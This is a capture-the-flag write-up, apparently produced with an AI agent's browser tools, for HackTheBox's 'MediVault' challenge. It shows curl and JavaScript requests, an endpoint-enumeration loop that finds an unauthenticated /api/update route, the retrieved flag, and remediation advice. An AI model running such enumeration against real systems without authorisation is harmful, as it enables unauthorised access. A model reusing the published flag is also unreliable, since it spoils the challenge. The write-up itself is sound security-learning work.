# MediVault — Mobile / Web

**Competition:** [ECU x NCNG CTF](https://ctf.hackthebox.com/event/details/ecu-x-ncng-ctf-3676) (HackTheBox)
**Category:** Mobile / Web · **Result:** ✅ Solved
**Flag:** `HTB{m3d1v4ult_upd4t3_expl01t3d!}`
**Target:** `http://154.57.164.70:34799/`

---

## The short version

A phone app downloaded its own "updates" from a server over an insecure connection, and that update
address, when I visited it directly, just handed back the flag. I never had to take the app itself
apart.

## Background

"MediVault" was a web page that compiles an Android APK pointed at the challenge server. The hint
pointed at the app's update mechanism ("the app wants to update itself; what is it downloading?").
Reversing an APK is slow, so I checked the server side first.

## Every step, in order (exact commands)

**1 — Open the page and read it.**

```
navigate -> http://154.57.164.70:34799
get_page_text
read_page (filter: interactive)
```

**2 — Inspect the page's markup and its compile script.**

```js
// read the DOM
document.body.innerHTML
// read the front-end script
await fetch('/script.js').then(r=>r.text())
```

This showed the page builds the APK by POSTing the server's own location to `/compile`.

**3 — Trigger the compile from the server side (dead end — flaky build).**

```bash
cd "/c/.../scratchpad" && mkdir -p apk && curl -s -X POST http://154.57.164.70:34799/compile -H "Content-Type: application/json" -d '{"host":"154.57.164.70","port":"34799","protocol":"http:","fullUrl":"http://154.57.164.70:34799"}'
```

I also tried it from the page's own context, with retries:

```js
const serverData={host:location.hostname,port:location.port,protocol:location.protocol,fullUrl:location.protocol+'//'+location.hostname+(location.port?':'+location.port:'')};
const r=await fetch('/compile',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(serverData)});
const j=await r.json();JSON.stringify(j)
```

```js
async function tryit(){const serverData={host:location.hostname,port:location.port,protocol:location.protocol,fullUrl:location.protocol+'//'+location.hostname+(location.port?':'+location.port:'')};const r=await fetch('/compile',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(serverData)});return await r.json();}
let res;for(let i=0;i<5;i++){res=await tryit();if(res.success)break;await new Promise(s=>setTimeout(s,3000));}
JSON.stringify(res)
```

And again from the shell, with waits between attempts:

```bash
curl -s --max-time 120 -X POST http://154.57.164.70:34799/compile -H "Content-Type: application/json" -d '{"host":"154.57.164.70","port":"34799","protocol":"http:","fullUrl":"http://154.57.164.70:34799"}'
```

```bash
curl -s --max-time 180 -X POST http://154.57.164.70:34799/compile -H "Content-Type: application/json" -d '{"host":"154.57.164.70","port":"34799","protocol":"http:","fullUrl":"http://154.57.164.70:34799"}'
```

The build was stateful and flaky — concurrent requests collided on a shared server-side working
directory and corrupted it. Reasoning: re-read the hint — it's about the *update mechanism*, so the
real target is whatever endpoint the app's updater talks to. Stop fighting the build.

**4 — Enumerate the server's endpoints (status + response size).**

```bash
base=http://154.57.164.70:34799
for p in /app.apk /medivault.apk /base.apk /download /downloads/ /files/ /static/ /api /update /api/update /version /api/version /check-update /latest; do
  code=$(curl -s -o /dev/null -w "%{http_code} %{size_download}" --max-time 15 "$base$p")
  echo "$p -> $code"
done
```

Output — one path broke the pattern:

```
/app.apk      -> 200 2256
/medivault.apk-> 200 2256
/base.apk     -> 200 2256
/download     -> 200 2256
/downloads/   -> 200 2256
/files/       -> 200 2256
/static/      -> 200 2256
/api          -> 200 2256
/update       -> 200 2256
/api/update   -> 200 48      <-- different
/version      -> 200 2256
/api/version  -> 200 2256
/check-update -> 200 2256
/latest       -> 200 2256
```

Reasoning: every path returned the same 2256-byte SPA fallback **except `/api/update` (48 bytes)**.
A response that differs from every other route is real functionality, not a catch-all.

**5 — Read the update endpoint.**

```bash
base=http://154.57.164.70:34799
echo "=== /api/update ==="; curl -s --max-time 15 "$base/api/update"; echo
echo "=== /api/update (POST) ==="; curl -s --max-time 15 -X POST "$base/api/update"; echo
echo "=== /api ==="; curl -s --max-time 15 "$base/api" | head -c 300; echo
```

Output:

```
=== /api/update ===
	HTB{m3d1v4ult_upd4t3_expl01t3d!}
```

The update endpoint served the flag directly over plain HTTP — no APK reversing required.

**6 — Submit the flag:** `HTB{m3d1v4ult_upd4t3_expl01t3d!}`.

## Technical detail

- **Setup:** a web app that compiles an Android APK whose self-update routine fetches from a server
  endpoint over plain HTTP.
- **Recon result:** SPA fallback (2256 bytes) on every path except `/api/update` (48 bytes = flag).
- **Root cause:** the update channel is unauthenticated and unencrypted, and the endpoint returns
  sensitive content to anyone.

## Lessons / remediation

- Serve updates over TLS (HTTPS), not plain HTTP.
- Authenticate the update channel and verify update integrity (signed updates) — an exposed update
  URL could let an attacker push a malicious "update" to every user.

## Tools used

- In-app browser: `navigate`, `get_page_text`, `read_page`, `javascript_tool` (DOM + `/compile`).
- `curl` — the `/compile` attempts, the endpoint-enumeration loop, and reading `/api/update`.
